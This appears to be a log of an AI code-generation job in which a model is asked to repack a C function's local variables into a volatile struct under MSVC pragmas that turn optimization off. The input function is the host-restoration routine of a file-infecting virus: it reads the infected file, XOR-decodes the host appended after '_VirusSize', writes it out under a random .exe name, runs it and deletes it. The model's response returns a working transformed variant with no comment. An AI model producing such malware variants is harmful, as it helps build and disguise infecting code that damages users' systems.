@@ -1,0 +1,338 @@
+=== META ===
+{
+  "finish_reason": "stop",
+  "attempts": 2,
+  "response_chars": 4155
+}
+
+=== PROMPT (8187 chars) ===
+
+            You are an expert C developer generating synthesized code variants.
+
+            ### YOUR OBJECTIVE
+            Apply "Local Context Struct Packaging" to the provided C function. You must bundle locally scoped variables into a single, locally defined structure. To ensure the compiler does not optimize this structure away, you must wrap the function in MSVC optimization pragmas and declare the structure instance as `volatile`. 
+            ### STRICT SELECTION CRITERIA
+            1. Target EVERY locally declared variable (e.g., scalars, pointers, arrays, handles), in the same order they were originally declared.
+            2. Target inline loop counters (e.g., the `i` in `for(int i = 0; ...)`).
+            3. DO NOT target function parameters (arguments passed into the function).
+            4. DO NOT target `static` variables or globally scoped variables.
+
+            ### TRANSFORMATION RULES (CRITICAL C SYNTAX)
+            1. **DISABLE OPTIMIZATIONS:** You MUST insert `#pragma optimize("", off)` immediately before the function signature, and `#pragma optimize("", on)` immediately after the function closes.
+            2. **STRUCT DEFINITION:** At the very beginning of the function body, define a structure named `struct _LocalCtx`.
+            3. **VOLATILE INSTANTIATION:** You MUST instantiate the structure with the `volatile` keyword as `volatile struct _LocalCtx ctx;`.
+            4. Move all targeted variable declarations into the `struct _LocalCtx` definition, preserving original declaration order.
+            5. **CRITICAL:** C structures do NOT allow inline initialization. You MUST separate the declaration (inside the struct) from the assignment (after the struct instantiation).
+            6. For variables that were initialized at declaration (e.g., `int count = 10;`), move `int count;` into the struct, and write `ctx.count = 10;` immediately after the struct is instantiated.
+            7. For inline loop counters (`for(int i = 0;)`), move `int i;` into the struct, and update the loop to `for(ctx.i = 0; ...)`.
+            8. Substitute EVERY subsequent usage of the targeted variables in the function with the `ctx.` prefix (e.g., `var_name` becomes `ctx.var_name`).
+
+            ### STRUCTURAL EXAMPLE (MIMIC THIS EXACTLY)
+
+            **Original Code:**
+```c
+            #include <windows.h>
+            int parse_data(char* input, DWORD size) {
+                HANDLE hHeap = GetProcessHeap();
+                int count = 0;
+                
+                if (input == NULL) { return -1; }
+                
+                for (int i = 0; i < size; i++) {
+                    count += 1;
+                }
+                return count;
+            }
+```
+            
+            **Transformed Code:**
+```c
+            #pragma optimize("", off)
+            #include <windows.h>
+            int parse_data(char* input, DWORD size) {
+                volatile struct _LocalCtx {
+                    HANDLE hHeap;
+                    int count;
+                    int i;
+                } ctx;
+                
+                // Initializations moved outside the struct definition
+                ctx.hHeap = GetProcessHeap();
+                ctx.count = 0;
+                
+                if (input == NULL) { return -1; }
+                
+                for (ctx.i = 0; ctx.i < size; ctx.i++) {
+                    ctx.count += 1;
+                }
+                return ctx.count;
+            }
+            #pragma optimize("", on)
+```
+
+            ### OUTPUT CONSTRAINTS (CRITICAL)
+            You MUST wrap the function in #pragma optimize("", off) and #pragma optimize("", on).
+            You MUST declare the struct instance as volatile.
+            NEVER assign a value inside the struct _LocalCtx { ... }; block.
+            DO NOT alter function parameters (input and size in the example remain untouched).
+            DO NOT OUTPUT ANY EXPLANATION, ANALYSIS, OR CONVERSATIONAL TEXT.
+            Return ONLY the exact, modified source code inside a single markdown code block (```c ... ```).
+            If the function contains no local variables to pack, return the original code wrapped in the markdown block without any changes.
+
+            INPUT CODE:
+            #include "data_globals.h"
+#include <windows.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+extern uint32_t _VirusSize;
+
+void _ReturnToHost(LPCSTR param_1)
+{
+    /* variable declarations (C89 style) */
+    HGLOBAL             hGlobalMemory;
+    const char         *randomChars;
+    HANDLE              hInputFile;
+    DWORD               fileSize;
+    DWORD               bytesRead;
+    DWORD               tickCount;
+    int                 randValue;
+    char                randChar1;
+    char                randChar2;
+    char                randChar3;
+    char                randChar4;
+    char                randChar5;
+    char                outputPath[10];
+    HANDLE              hOutputFile;
+    uint32_t            offset;
+    DWORD               bytesWritten;
+    STARTUPINFOA        si;
+    PROCESS_INFORMATION pi;
+
+    /* initialization */
+    hGlobalMemory = (HGLOBAL)0;
+    randomChars   = "AcGh9Kl6";
+
+    hInputFile = CreateFileA(param_1,
+                             GENERIC_READ,
+                             FILE_SHARE_READ,
+                             (LPSECURITY_ATTRIBUTES)0,
+                             OPEN_EXISTING,
+                             FILE_ATTRIBUTE_NORMAL,
+                             (HANDLE)0);
+    if (hInputFile == INVALID_HANDLE_VALUE) {
+        ExitProcess(0);
+    }
+
+    fileSize = GetFileSize(hInputFile, (LPDWORD)0);
+    hGlobalMemory = GlobalAlloc(GMEM_MOVEABLE, fileSize);
+    if (hGlobalMemory == (HGLOBAL)0) {
+        CloseHandle(hInputFile);
+        ExitProcess(0);
+    }
+
+    ReadFile(hInputFile, hGlobalMemory, fileSize, &bytesRead, (LPOVERLAPPED)0);
+    CloseHandle(hInputFile);
+
+    tickCount = GetTickCount();
+    srand(tickCount);
+
+    randValue = rand();
+    randChar1 = randomChars[randValue % 8];
+    randValue = rand();
+    randChar2 = randomChars[randValue % 8];
+    randValue = rand();
+    randChar3 = randomChars[randValue % 8];
+    randValue = rand();
+    randChar4 = randomChars[randValue % 8];
+    randValue = rand();
+    randChar5 = randomChars[randValue % 8];
+    randValue = rand();
+
+    /* FIX: use snprintf to avoid any chance of overflow. */
+    snprintf(outputPath, sizeof(outputPath),
+             "%c%c%c%c%c%c.exe",
+             (int)randomChars[randValue % 8],
+             (int)randChar5,
+             (int)randChar4,
+             (int)randChar3,
+             (int)randChar2,
+             (int)randChar1);
+
+    hOutputFile = CreateFileA(outputPath,
+                              GENERIC_WRITE,
+                              FILE_SHARE_WRITE,
+                              (LPSECURITY_ATTRIBUTES)0,
+                              CREATE_ALWAYS,
+                              FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE,
+                              (HANDLE)0);
+
+    if (hOutputFile != INVALID_HANDLE_VALUE) {
+        for (offset = _VirusSize; offset < fileSize; ++offset) {
+            ((uint8_t *)hGlobalMemory)[offset] ^= 0x4A;
+        }
+
+        SetFilePointer(hOutputFile, 0, (PLONG)0, FILE_BEGIN);
+        WriteFile(hOutputFile,
+                  (LPCVOID)(((uint8_t *)hGlobalMemory) + _VirusSize),
+                  fileSize - _VirusSize,
+                  &bytesWritten,
+                  (LPOVERLAPPED)0);
+        CloseHandle(hOutputFile);
+        GlobalFree(hGlobalMemory);
+
+        memset(&si, 0, sizeof(si));
+        memset(&pi, 0, sizeof(pi));
+        si.cb          = sizeof(si);
+        si.dwFlags     = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_SHOW;
+
+        CreateProcessA(NULL,
+                       outputPath,
+                       NULL,
+                       NULL,
+                       FALSE,
+                       CREATE_NEW_CONSOLE,
+                       NULL,
+                       NULL,
+                       &si,
+                       &pi);
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        DeleteFileA(outputPath);
+        ExitProcess(0);
+    }
+}
+
+            
+
+=== RESPONSE (4155 chars) ===
+```c
+#include "data_globals.h"
+#include <windows.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+extern uint32_t _VirusSize;
+
+#pragma optimize("", off)
+void _ReturnToHost(LPCSTR param_1)
+{
+    volatile struct _LocalCtx {
+        HGLOBAL hGlobalMemory;
+        const char *randomChars;
+        HANDLE hInputFile;
+        DWORD fileSize;
+        DWORD bytesRead;
+        DWORD tickCount;
+        int randValue;
+        char randChar1;
+        char randChar2;
+        char randChar3;
+        char randChar4;
+        char randChar5;
+        char outputPath[10];
+        HANDLE hOutputFile;
+        uint32_t offset;
+        DWORD bytesWritten;
+        STARTUPINFOA si;
+        PROCESS_INFORMATION pi;
+    } ctx;
+
+    // Initializations moved outside the struct definition
+    ctx.hGlobalMemory = (HGLOBAL)0;
+    ctx.randomChars = "AcGh9Kl6";
+
+    ctx.hInputFile = CreateFileA(param_1,
+                                 GENERIC_READ,
+                                 FILE_SHARE_READ,
+                                 (LPSECURITY_ATTRIBUTES)0,
+                                 OPEN_EXISTING,
+                                 FILE_ATTRIBUTE_NORMAL,
+                                 (HANDLE)0);
+    if (ctx.hInputFile == INVALID_HANDLE_VALUE) {
+        ExitProcess(0);
+    }
+
+    ctx.fileSize = GetFileSize(ctx.hInputFile, (LPDWORD)0);
+    ctx.hGlobalMemory = GlobalAlloc(GMEM_MOVEABLE, ctx.fileSize);
+    if (ctx.hGlobalMemory == (HGLOBAL)0) {
+        CloseHandle(ctx.hInputFile);
+        ExitProcess(0);
+    }
+
+    ReadFile(ctx.hInputFile, ctx.hGlobalMemory, ctx.fileSize, &ctx.bytesRead, (LPOVERLAPPED)0);
+    CloseHandle(ctx.hInputFile);
+
+    ctx.tickCount = GetTickCount();
+    srand(ctx.tickCount);
+
+    ctx.randValue = rand();
+    ctx.randChar1 = ctx.randomChars[ctx.randValue % 8];
+    ctx.randValue = rand();
+    ctx.randChar2 = ctx.randomChars[ctx.randValue % 8];
+    ctx.randValue = rand();
+    ctx.randChar3 = ctx.randomChars[ctx.randValue % 8];
+    ctx.randValue = rand();
+    ctx.randChar4 = ctx.randomChars[ctx.randValue % 8];
+    ctx.randValue = rand();
+    ctx.randChar5 = ctx.randomChars[ctx.randValue % 8];
+    ctx.randValue = rand();
+
+    snprintf(ctx.outputPath, sizeof(ctx.outputPath),
+             "%c%c%c%c%c%c.exe",
+             (int)ctx.randomChars[ctx.randValue % 8],
+             (int)ctx.randChar5,
+             (int)ctx.randChar4,
+             (int)ctx.randChar3,
+             (int)ctx.randChar2,
+             (int)ctx.randChar1);
+
+    ctx.hOutputFile = CreateFileA(ctx.outputPath,
+                                  GENERIC_WRITE,
+                                  FILE_SHARE_WRITE,
+                                  (LPSECURITY_ATTRIBUTES)0,
+                                  CREATE_ALWAYS,
+                                  FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE,
+                                  (HANDLE)0);
+
+    if (ctx.hOutputFile != INVALID_HANDLE_VALUE) {
+        for (ctx.offset = _VirusSize; ctx.offset < ctx.fileSize; ++ctx.offset) {
+            ((uint8_t *)ctx.hGlobalMemory)[ctx.offset] ^= 0x4A;
+        }
+
+        SetFilePointer(ctx.hOutputFile, 0, (PLONG)0, FILE_BEGIN);
+        WriteFile(ctx.hOutputFile,
+                  (LPCVOID)(((uint8_t *)ctx.hGlobalMemory) + _VirusSize),
+                  ctx.fileSize - _VirusSize,
+                  &ctx.bytesWritten,
+                  (LPOVERLAPPED)0);
+        CloseHandle(ctx.hOutputFile);
+        GlobalFree(ctx.hGlobalMemory);
+
+        memset(&ctx.si, 0, sizeof(ctx.si));
+        memset(&ctx.pi, 0, sizeof(ctx.pi));
+        ctx.si.cb          = sizeof(ctx.si);
+        ctx.si.dwFlags     = STARTF_USESHOWWINDOW;
+        ctx.si.wShowWindow = SW_SHOW;
+
+        CreateProcessA(NULL,
+                       ctx.outputPath,
+                       NULL,
+                       NULL,
+                       FALSE,
+                       CREATE_NEW_CONSOLE,
+                       NULL,
+                       NULL,
+                       &ctx.si,
+                       &ctx.pi);
+        WaitForSingleObject(ctx.pi.hProcess, INFINITE);
+        DeleteFileA(ctx.outputPath);
+        ExitProcess(0);
+    }
+}
+#pragma optimize("", on)
+```
